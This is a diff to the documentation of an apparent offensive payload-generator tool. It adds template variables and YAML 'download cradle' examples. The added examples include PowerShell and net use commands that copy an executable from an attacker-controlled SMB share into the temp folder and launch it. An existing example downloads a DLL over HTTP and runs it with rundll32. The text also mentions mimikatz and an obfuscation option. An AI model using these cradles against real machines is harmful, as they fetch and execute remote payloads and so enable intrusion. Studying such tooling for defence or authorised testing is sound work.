@@ -884,25 +884,42 @@ Features can use `code`, `command`, or both:
 
 **Available Variables:**
 
-| Variable | Description | Example | Required |
-|----------|-------------|---------|----------|
-| `{{ url }}` | Base URL constructed from lhost/lport (without filename) | `http://192.168.1.100:8080` or `https://192.168.1.100` | Always |
-| `{{ output_file }}` | Output filename from payload parameters | `payload.exe` | Always |
-| `{{ output_path }}` | Full path to the output directory | `/home/user/payloads` | Always |
-| `{{ namespace }}` | .NET namespace for assembly loading | `MyApp` | Optional |
-| `{{ class }}` | .NET class name containing entry point | `Program` | Optional |
-| `{{ entry_point }}` | Entry point method/function name | `Main` or `DllMain` | Optional |
-| `{{ args }}` | Command-line arguments for assembly invocation | `arg1 arg2` | Optional |
+| Variable | Description | Example |
+|----------|-------------|---------|
+| `{{ url }}` | Base URL constructed from lhost/lport (without filename) - only if used in template | `http://192.168.1.100:8080` or `https://192.168.1.100` |
+| `{{ lhost }}` | Listening host IP or domain | `192.168.1.100` |
+| `{{ lport }}` | Listening port | `8080` or `443` |
+| `{{ output_file }}` | Output filename from payload parameters | `payload.exe` |
+| `{{ output_path }}` | Full path to the output directory | `/home/user/payloads` |
+| `{{ namespace }}` | .NET namespace for assembly loading | `MyApp` |
+| `{{ class }}` | .NET class name containing entry point | `Program` |
+| `{{ entry_point }}` | Entry point method/function name | `Main` or `DllMain` |
+| `{{ args }}` | Command-line arguments for assembly invocation | `arg1 arg2` |
+
+**Note:** All variables are available for use in cradle templates. `{{ url }}` is only constructed if it's actually used in the template, allowing for protocols like SMB that don't use HTTP/HTTPS URLs.
 
 **URL Construction Logic:**
 
-The `{{ url }}` variable contains only the base URL without the output filename:
+The `{{ url }}` variable contains only the base URL without the output filename (automatically constructed only if used):
 
 - Port 80: `http://{{ lhost }}`
 - Port 443: `https://{{ lhost }}`
 - Other ports: `http://{{ lhost }}:{{ lport }}`
 
 In YAML cradle templates, combine `{{ url }}` with `{{ output_file }}` like: `{{ url }}/{{ output_file }}`
+
+**Direct Host/Port Access:**
+
+For protocols that don't use HTTP/HTTPS URLs (like SMB), use `{{ lhost }}` and `{{ lport }}` directly:
+
+```yaml
+# SMB cradle example
+- name: SMB Copy-Item (EXE)
+  type: cradle-exe
+  code: |
+    Copy-Item "\\{{ lhost }}\share\{{ output_file }}" "$env:TEMP\{{ output_file }}";
+    Start-Process "$env:TEMP\{{ output_file }}"
+```
 
 **Assembly Loading Variables:**
 
@@ -979,6 +996,27 @@ This avoids generating commands with empty quotes like `mimikatz "" "privilege::
     (New-Object System.Net.WebClient).DownloadFile("{url}/{output_file}", "$env:TEMP\{output_file}");
     rundll32.exe "$env:TEMP\{output_file}",{entry_point}
 ```
+
+**Example - SMB Cradle (Using {{ lhost }} directly):**
+```yaml
+- name: SMB Copy-Item (EXE)
+  type: cradle-exe
+  no-obf: false
+  code: |
+    Copy-Item "\\{{ lhost }}\share\{{ output_file }}" "$env:TEMP\{{ output_file }}";
+    Start-Process "$env:TEMP\{{ output_file }}"
+
+- name: SMB Net Use + Copy (EXE)
+  type: cradle-exe
+  no-obf: false
+  code: |
+    net use \\{{ lhost }}\share /user:guest "";
+    copy \\{{ lhost }}\share\{{ output_file }} $env:TEMP\{{ output_file }};
+    Start-Process "$env:TEMP\{{ output_file }}";
+    net use \\{{ lhost }}\share /delete
+```
+
+*SMB cradles use `{{ lhost }}` directly instead of `{{ url }}` since SMB uses UNC paths. The `{{ lport }}` variable is also available but typically not needed for SMB (port 445).*
 
 This gives you full control over how the URL is constructed and how assemblies are loaded in each cradle template.
 
